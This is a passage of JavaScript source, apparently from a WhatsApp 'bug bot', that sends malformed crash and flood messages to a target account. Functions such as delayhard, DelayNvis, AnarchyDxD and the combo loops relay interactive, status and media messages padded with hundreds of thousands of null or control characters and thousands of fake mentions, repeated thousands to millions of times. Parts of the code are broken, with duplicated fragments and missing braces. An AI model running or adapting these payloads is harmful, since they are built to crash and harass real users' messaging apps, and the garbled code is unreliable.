  for (let i = 0; i < 2000; i++) {
    const delay = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0018".repeat(200000),
              version: 3
            }
          }
        }
      }
    };
    await sock.sendMessage(jid, delay);
  }
}

async function delayhard3(jid, sock) {
  for (let i = 0; i < 3000; i++) {
    const delay = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0018".repeat(300000),
              version: 3
            }
          }
        }
      }
    };
    await sock.sendMessage(jid, delay);
  }
}

async function delayhard4(jid, sock) {
  for (let i = 0; i < 3000; i++) {
    const delay = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0018".repeat(400000),
              version: 3
            }
          }
        }
      }
    };
    await sock.sendMessage(jid, delay);
  }
}

async function delayhard5(jid, sock) {
  for (let i = 0; i < 3000; i++) {
    const delay = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0018".repeat(500000),
              version: 3
            }
          }
        }
      }
    };
    await sock.sendMessage(jid, delay);
  }
}

async function CrashTmpText(jid, Ptcp = true) {
 for (let i = 0; i < 1000000; i++) {
  await sock.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: 'call_permission_request',
            paramsJson: "\u0000".repeat(1045000),
            version: 3
           }
     }
        }
      }
    }
  },
  Ptcp ? {
    participant: { jid: jid }
  } : {}
  );
}
  
async function DelayNvis(jid, sock) {
  for (let i = 0; i < 1000000; i++) {
    let msg = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: jid,
                mentions: Array.from(
                  { length: 2000 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
                isForwarded: true,
                fromMe: false,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "1234567891038@newsletter",
                  serverMessageId: 1,
                  newsletterName: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬"
                }
              },
              body: {
                text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        participant: { jid: jid }
      }
    );

    let Joomodss = generateWAMessageFromContent(
      jid,
      {
        buttonsMessage: {
          text: "#!",
          contentText: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
          footerText: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
          buttons: [
            {
              buttonId: ".x",
              buttonText: {
                displayText: "JooModdss" + "\u0018".repeat(239999)
              },
              type: 1
            }
          ],
          headerType: 1
        }
      },
      {}
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: msg.key.id, participant: { jid: jid } }
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: Joomodss.message
        }
      },
      { messageId: Joomodss.key.id, participant: { jid: jid } }
    );
    
    groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: msg.key.id, participant: { jid: jid } }
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: Joomodss.message
        }
      },
      { messageId: Joomodss.key.id, participant: { jid: jid } }
    );

    await new Promise(resolve => setTimeout(resolve, 1));
  }
}

async function delayinvis(jid, sock) {
  try {
   
    const mentionedJid = [jid];
    for (let i = 0; i < 5000; i++) {
      let rand = Math.floor(Math.random() * 7000000);
      mentionedJid.push("1" + rand + "@s.whatsapp.net");
    }

   
    const msg1 = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0000",
              hasMediaAttachment: null,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "tes Atur dikit",
                address: "\u0000",
              },
            },
            body: {
              text: "Tes",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(4500),
            },
            contextInfo: {
              participant: jid,
              mentionedJid: mentionedJid,
            },
          },
        },
      },
    };

    
    const msg2 = await generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Tes",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(4500),
                version: 3,
              },
              entryPointConversionSource: "call_permission_request",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0"),
      }
    );

    
    const msg = await generateWAMessageFromContent(jid, msg1, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: null },
              ],
            },
          ],
        },
      ],
    });

    
    if (mention) {
      await sock.relayMessage(
        jid,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {}
      );
    }
  } catch (err) {
    console.log(err);
  }

  console.log(chalk.green(`- Send Bug Ke  ${jid} `));
}



async function DelayNvis2(jid, sock) {
  for (let i = 0; i < 1000000; i++) {
    let msg = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: jid,
                mentions: Array.from(
                  { length: 2000 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
                isForwarded: true,
                fromMe: false,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "1234567891038@newsletter",
                  serverMessageId: 1,
                  newsletterName: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬"
                }
              },
              body: {
                text: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        participant: { jid: jid }
      }
    );

    let Joomodss = generateWAMessageFromContent(
      jid,
      {
        buttonsMessage: {
          text: "#!",
          contentText: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
          footerText: "🧪𝕿𝕰𝖃𝖀𝕾 𝕭𝖄 𝕽7𝖃🧬",
          buttons: [
            {
              buttonId: ".x",
              buttonText: {
                displayText: "JooModdss" + "\u0018".repeat(239999)
              },
              type: 1
            }
          ],
          headerType: 1
        }
      },
      {}
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: msg.key.id, participant: { jid: jid } }
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: Joomodss.message
        }
      },
      { messageId: Joomodss.key.id, participant: { jid: jid } }
    );
    
    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: msg.key.id, participant: { jid: jid } }
    );

    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: Joomodss.message
        }
      },
      { messageId: Joomodss.key.id, participant: { jid: jid } }
    );

    await new Promise(resolve => setTimeout(resolve, 1));
  }
}

async function AnarchyDxD(jid, sock) {
  try {
    let totalUser = 1900;
    const totalJid = 500000;
    const pause = 3500;
    const functions = () => "1" + Math.floor(Math.random() * totalJid) + "@s.whatsapp.net";
    const contextResponse = {
      participant: jid,
      stanzaId: jid,
      forwardingScore: 9706,
      isForwarded: true,
      mentionedJid: Array.from({
        length: totalUser
      }, functions),
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 3,
          expiryTimestamp: Date.now() + 1814400000
        }
      }
    };
    const txt = "ꦾ".repeat(20000) + "ꦾ".repeat(60000);
    
    const msg1 = generateWAMessageFromContact(jid, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@rvnnsix",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              params: `${"\u0000".repeat(1045000)}`,
              version: 3
            },
            contextInfo: contextResponse
          }
        }
      }
    }, {});
    
  const msg2 = generateWAMessageFromContact(jid, {
   viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999999",
          height: "9999999999999999",
          width: "9999999999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: txt,
          contextInfo: contextResponse
        }
      }
    }
  }, {});
  
    const msg3 = generateWAMessageFromContact(jid, {
      ephemeralMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@rvnnsix" + txt,
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              params: `${"\u0000".repeat(1045000)}`,
              version: 3
            },
            contextInfo: contextResponse
          }
        }
      }
    }, {});
    
    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: jid } }]
        }]
      }]
    });
    await new Promise((r) => setTimeout(r, pause));
    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: jid } }]
        }]
      }]
    });
    await new Promise((r) => setTimeout(r, pause));
    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: jid } }]
        }]
      }]
    });
  } catch (error) {
    console.log(error);
  }
}




async function combo(jid, sock) {
    for (let i = 2; i < 5000; i++) {
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);

    }
}

async function combo1(jid, sock) {
    for (let i = 10; i < 25000; i++) {
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
